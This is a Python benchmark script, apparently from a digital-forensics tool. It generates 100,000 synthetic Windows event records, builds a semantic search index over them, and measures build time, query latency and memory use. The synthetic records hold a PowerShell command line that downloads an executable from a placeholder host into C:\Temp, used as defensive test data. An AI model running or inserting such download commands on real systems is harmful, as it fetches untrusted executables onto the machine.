"""Explicit Windows scale benchmark; 100k mapped records / 1000 unique texts.

Run with --work pointing outside the repository and --model at a local BGE model.
This duplicate-heavy corpus does not measure 100k unique embedding computations.
"""
import sys,pathlib,time,json,ctypes,os,argparse
repo=pathlib.Path(__file__).resolve().parents[1]
sys.path[:0]=[str(repo),str(repo/'tests')]
from forensic_assistant.database.db import connect,register_source
from forensic_assistant.semantic.model import LocalModel
from forensic_assistant.semantic.index import build,search,status
from test_ingest import SHA
p=argparse.ArgumentParser();p.add_argument('--work',type=pathlib.Path,required=True);p.add_argument('--model',type=pathlib.Path,required=True)
args=p.parse_args();root=args.work;root.mkdir(parents=True,exist_ok=True)
db=connect(root/'synthetic.db')
if not db.execute('SELECT count(*) FROM evidence_records').fetchone()[0]:
    with db:
        register_source(db,SHA,1,'synthetic-only.evtx')
        for i in range(100000):
            eid=f'EVTX:{SHA}:Offset:{i}'
            db.execute('INSERT INTO evidence_records(evidence_id,source_type,artifact_type,file_sha256,source_file,locator_json,parser_name,parser_version,extractor_version,warnings_json,original_json) VALUES (?,?,?,?,?,?,?,?,?,?,?)',(eid,'evtx','process',SHA,'synthetic-only.evtx','{}','synthetic','1','1','[]','{}'))
            # Deliberately minimal synthetic normalized events; never case evidence.
            variant=i%1000
            db.execute('INSERT INTO events(id,file_sha256,source_file,record_offset,timestamp_status,provider,event_id,process_name,command_line,event_data_json,normalization_warnings_json,normalizer_version,raw_xml) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)',(eid,SHA,'synthetic-only.evtx',i,'missing','Synthetic',4688,'powershell.exe',f'Invoke-WebRequest https://example.invalid/tool{variant}.exe -OutFile C:\\Temp\\tool{variant}.exe','{}','[]','synthetic','<Synthetic/>'))
    print('GENERATED 100000 synthetic evidence records',flush=True)
model=LocalModel(args.model)
started=time.perf_counter()
result=build(db,root/'index',model,rebuild=True,max_vectors=1000000,progress=lambda n:print('VECTORS',n,'SECONDS',round(time.perf_counter()-started,1),flush=True))
result['end_to_end_build_seconds']=time.perf_counter()-started
latencies=[]
for _ in range(3):
    t=time.perf_counter();hits=search(db,root/'index',model,'PowerShell downloading executable',limit=10);latencies.append(time.perf_counter()-t)
class Memory(ctypes.Structure):
    _fields_=[('cb',ctypes.c_ulong),('PageFaultCount',ctypes.c_ulong)]+[(n,ctypes.c_size_t) for n in ('PeakWorkingSetSize','WorkingSetSize','QuotaPeakPagedPoolUsage','QuotaPagedPoolUsage','QuotaPeakNonPagedPoolUsage','QuotaNonPagedPoolUsage','PagefileUsage','PeakPagefileUsage')]
m=Memory();m.cb=ctypes.sizeof(m)
from ctypes import wintypes
ctypes.windll.kernel32.GetCurrentProcess.restype=wintypes.HANDLE
ctypes.windll.psapi.GetProcessMemoryInfo.argtypes=[wintypes.HANDLE,ctypes.POINTER(Memory),wintypes.DWORD]
assert ctypes.windll.psapi.GetProcessMemoryInfo(ctypes.windll.kernel32.GetCurrentProcess(),ctypes.byref(m),m.cb)
active=root/'index'/(root/'index'/'CURRENT').read_text()
result.update(query_seconds=latencies,peak_working_set_bytes=m.PeakWorkingSetSize,returned=len(hits['results']),active_generation_bytes=sum(p.stat().st_size for p in active.rglob('*') if p.is_file()),retained_index_bytes=sum(p.stat().st_size for p in (root/'index').rglob('*') if p.is_file()))
(root/'result.json').write_text(json.dumps(result,indent=2));print(json.dumps(result),flush=True)
